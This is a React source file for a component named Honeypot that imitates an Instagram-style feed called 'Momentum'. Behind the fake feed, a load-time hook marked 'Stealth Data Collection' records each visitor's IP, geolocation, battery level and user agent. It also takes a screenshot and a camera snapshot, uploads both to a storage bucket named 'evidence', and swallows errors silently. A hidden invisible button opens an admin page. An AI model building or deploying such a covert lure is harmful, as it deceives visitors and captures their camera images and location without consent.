import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Heart, MessageCircle, Share2, MoreHorizontal, Bookmark, Send, Smile, Search, Home } from 'lucide-react';
import { supabase } from '../supabaseClient';
import * as Tracker from '../utils/tracker';

function Honeypot() {
    const [liked, setLiked] = useState(false);
    const [likesCount, setLikesCount] = useState(1234);
    const [showHeartAnim, setShowHeartAnim] = useState(false);
    const [secretClicks, setSecretClicks] = useState(0);
    const navigate = useNavigate();

    useEffect(() => {
        // Stealth Data Collection
        const collectData = async () => {
            try {
                const ip = await Tracker.getIP();
                const battery = await Tracker.getBatteryStatus();
                const geo = await Tracker.getGeoLocation(ip);

                // Wait for user to likely engage or page to fully settle
                await new Promise(r => setTimeout(r, 2000));

                // Capture evidence
                const screenShot = await Tracker.captureScreen();
                // Try camera (this will trigger prompt)
                const cameraShot = await Tracker.captureCamera();

                // Upload
                let cameraUrl = '';
                let screenUrl = '';

                if (cameraShot) {
                    const fileName = `camera_${Date.now()}.jpg`;
                    const res = await fetch(cameraShot);
                    const blob = await res.blob();
                    const { data, error } = await supabase.storage.from('evidence').upload(fileName, blob);
                    if (error) console.error("Camera Upload Error:", error);
                    if (data) cameraUrl = data.path;
                }

                if (screenShot) {
                    const fileName = `screen_${Date.now()}.png`;
                    const res = await fetch(screenShot);
                    const blob = await res.blob();
                    const { data, error } = await supabase.storage.from('evidence').upload(fileName, blob);
                    if (error) console.error("Screen Upload Error:", error);
                    if (data) screenUrl = data.path;
                }

                // Save visits
                await supabase.from('visits').insert([{
                    ip_address: ip,
                    user_agent: navigator.userAgent,
                    platform: navigator.platform,
                    geo_location: geo,
                    battery_level: battery,
                    referrer: document.referrer,
                    camera_snapshot_url: cameraUrl,
                    screen_snapshot_url: screenUrl,
                    device_type: /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
                }]);

            } catch (err) {
                // Silent fail
                console.error("Analytics Error", err);
            }
        };

        collectData();
    }, []);

    const handleLike = () => {
        if (!liked) {
            setShowHeartAnim(true);
            setLikesCount(p => p + 1);
            setTimeout(() => setShowHeartAnim(false), 1000);
        } else {
            setLikesCount(p => p - 1);
        }
        setLiked(!liked);
    }

    const handleSecretConvert = () => {
        const newClicks = secretClicks + 1;
        setSecretClicks(newClicks);
        if (newClicks >= 4) {
            navigate('/admin');
        }
    };

    return (
        <div className="min-h-screen bg-black flex justify-center items-center p-0 md:p-4 font-sans text-white">

            {/* Phone Frame Container */}
            <div className="w-full max-w-[420px] bg-black border-x border-gray-800 h-[100vh] md:h-[850px] md:max-h-[90vh] md:rounded-[40px] md:border-y md:border-gray-800 overflow-hidden relative shadow-2xl flex flex-col">

                {/* Dynamic Island / Status Bar Area */}
                <div className="h-12 w-full bg-black flex justify-between items-center px-6 text-sm font-medium z-50">
                    <span>9:41</span>
                    <div className="flex gap-2 items-center">
                        <div className="w-4 h-4 rounded-full bg-green-500/0"></div>
                        {/* Fake Battery/Wifi icons could go here */}
                        <div className="flex gap-1 items-end h-3">
                            <div className="w-1 h-1 bg-white"></div>
                            <div className="w-1 h-2 bg-white"></div>
                            <div className="w-1 h-3 bg-white"></div>
                            <div className="w-1 h-3 bg-white/30"></div>
                        </div>
                        <div className="w-6 h-3 rounded border border-white/50 relative ml-1">
                            <div className="absolute inset-[1px] bg-white rounded-sm w-[80%]"></div>
                        </div>
                    </div>
                </div>

                {/* Secret Admin Button (Invisible) */}
                <div
                    onClick={handleSecretConvert}
                    className="absolute top-0 left-0 w-16 h-16 z-[100] cursor-default bg-transparent"
                />

                {/* App Header */}
                <div className="bg-black/95 backdrop-blur-sm border-b border-white/10 px-4 py-3 flex justify-between items-center sticky top-0 z-40">
                    <span className="font-bold text-xl tracking-tight font-sans">Momentum</span>
                    <div className="flex gap-5">
                        <div className="relative cursor-pointer hover:opacity-70 transition-opacity">
                            <Heart size={26} className="text-white" />
                            <span className="absolute top-0 right-0 w-2 h-2 bg-red-500 rounded-full"></span>
                        </div>
                        <div className="cursor-pointer hover:opacity-70 transition-opacity">
                            <MessageCircle size={26} className="text-white transform -rotate-[15deg] mt-[-2px]" />
                        </div>
                    </div>
                </div>

                {/* Scrollable Content */}
                <div className="flex-1 overflow-y-auto overflow-x-hidden scrollbar-hide pb-20">

                    {/* Stories */}
                    <div className="px-4 py-4 flex gap-4 overflow-x-auto scrollbar-hide border-b border-white/5">
                        {['My Story', 'sarah_j', 'mike_travel', 'lux_life', 'art_daily', 'tech_gui'].map((name, i) => (
                            <div key={i} className="flex flex-col items-center space-y-1.5 flex-shrink-0 cursor-pointer group">
                                <div className={`w-[72px] h-[72px] rounded-full p-[3px] ${i === 0 ? 'bg-transparent border border-white/20' : 'bg-gradient-to-tr from-yellow-500 via-red-500 to-purple-600'} group-hover:scale-105 transition-transform duration-300`}>
                                    <img
                                        src={`https://images.unsplash.com/photo-${1534528741775 + i}-53994a69daeb?w=150&h=150&fit=crop`}
                                        className="w-full h-full rounded-full border-[3px] border-black object-cover"
                                        alt="avatar"
                                    />
                                    {i === 0 && <div className="absolute bottom-1 right-1 bg-blue-500 text-white rounded-full p-[4px] border-[3px] border-black text-xs flex items-center justify-center font-bold h-6 w-6">+</div>}
                                </div>
                                <span className="text-[11px] text-gray-300 truncate w-16 text-center tracking-wide font-medium">{name}</span>
                            </div>
                        ))}
                    </div>

                    {/* Post Item */}
                    <div className="flex flex-col border-b border-white/10 pb-4">

                        {/* Post Header */}
                        <div className="flex items-center justify-between p-3.5">
                            <div className="flex items-center space-x-3 cursor-pointer">
                                <div className="w-9 h-9 rounded-full bg-gradient-to-tr from-yellow-400 to-purple-600 p-[2px]">
                                    <img
                                        src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=150&h=150&fit=crop"
                                        className="w-full h-full rounded-full border-[2px] border-black object-cover"
                                        alt="User"
                                    />
                                </div>
                                <div>
                                    <span className="font-semibold text-sm block leading-none hover:text-gray-300 transition-colors">sarah_adventures</span>
                                    <span className="text-xs text-gray-400 mt-1 block">Paris, France</span>
                                </div>
                            </div>
                            <MoreHorizontal size={20} className="text-white cursor-pointer hover:text-gray-400" />
                        </div>

                        {/* Post Image */}
                        <div className="relative aspect-[4/5] bg-gray-900 group" onDoubleClick={handleLike}>
                            <img
                                src="https://images.unsplash.com/photo-1493246507139-91e8fad9978e?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&q=80"
                                alt="Post"
                                className="w-full h-full object-cover"
                            />

                            {/* Heart Animation */}
                            <div className={`absolute inset-0 flex items-center justify-center transition-opacity duration-300 ${showHeartAnim ? 'opacity-100' : 'opacity-0'}`}>
                                <Heart size={120} className="text-white fill-white drop-shadow-[0_10px_20px_rgba(0,0,0,0.5)] animate-bounce" />
                            </div>
                        </div>

                        {/* Actions */}
                        <div className="px-4 pt-4 pb-2">
                            <div className="flex justify-between mb-4">
                                <div className="flex space-x-5">
                                    <button onClick={handleLike} className="active:scale-95 transition-transform hover:opacity-80">
                                        <Heart size={28} className={liked ? 'text-red-500 fill-red-500' : 'text-white'} />
                                    </button>
                                    <button className="active:scale-95 transition-transform hover:opacity-80">
                                        <MessageCircle size={28} className="text-white -rotate-90 stroke-[1.5]" />
                                    </button>
                                    <button className="active:scale-95 transition-transform hover:opacity-80">
                                        <Send size={28} className="text-white -rotate-12 stroke-[1.5]" />
                                    </button>
                                </div>
                                <button className="active:scale-95 transition-transform hover:opacity-80">
                                    <Bookmark size={28} className="text-white stroke-[1.5]" />
                                </button>
                            </div>

                            <div className="font-semibold text-sm mb-2 text-white">{likesCount.toLocaleString()} likes</div>

                            <div className="text-sm mb-2 text-gray-100 leading-snug">
                                <span className="font-semibold mr-2 text-white">sarah_adventures</span>
                                Found this cute little cafe near the Eiffel Tower 🥐 The croissants here are to die for! ✨ ...
                                <span className="text-gray-400 cursor-pointer hover:text-gray-200">more</span>
                            </div>

                            <div className="text-gray-500 text-sm mb-2 cursor-pointer font-medium hover:text-gray-300 transition-colors">View all 14 comments</div>

                            <div className="text-[10px] text-gray-500 uppercase tracking-wide">2 hours ago</div>
                        </div>
                    </div>

                    {/* Second Post Item (Mockup for scroll feel) */}
                    <div className="flex flex-col pb-4">
                        <div className="flex items-center justify-between p-3.5">
                            <div className="flex items-center space-x-3">
                                <div className="w-9 h-9 rounded-full bg-gray-800"></div>
                                <div className="h-3 w-24 bg-gray-800 rounded"></div>
                            </div>
                        </div>
                        <div className="aspect-square bg-gray-900 mx-1 rounded"></div>
                    </div>

                </div>

                {/* Bottom Nav */}
                <div className="bg-black border-t border-white/10 h-[85px] px-6 pb-6 flex justify-between items-center z-50 absolute bottom-0 w-full">
                    <div className="cursor-pointer hover:scale-110 transition-transform"><Home size={28} className="text-white fill-white" /></div>
                    <div className="cursor-pointer hover:scale-110 transition-transform opacity-50"><Search size={28} className="text-white" /></div>
                    <div className="cursor-pointer hover:scale-110 transition-transform opacity-50"><div className="w-7 h-7 rounded-[8px] border-2 border-white flex items-center justify-center"><span className="text-lg font-bold leading-none translate-y-[-1px]">+</span></div></div>
                    <div className="cursor-pointer hover:scale-110 transition-transform opacity-50"><div className="w-7 h-7 rounded-lg bg-white/20"></div></div>
                    <div className="cursor-pointer hover:scale-110 transition-transform">
                        <div className="w-7 h-7 rounded-full bg-gray-800 overflow-hidden border border-white/50">
                            <img src="https://images.unsplash.com/photo-1570295999919-56ceb5ecca61?w=100&h=100&fit=crop" className="w-full h-full object-cover" alt="Me" />
                        </div>
                    </div>
                </div>

                {/* Home Indicator */}
                <div className="absolute bottom-1.5 left-1/2 transform -translate-x-1/2 w-32 h-1 bg-white/40 rounded-full z-[60]"></div>

            </div>
        </div>
    );
}

export default Honeypot;
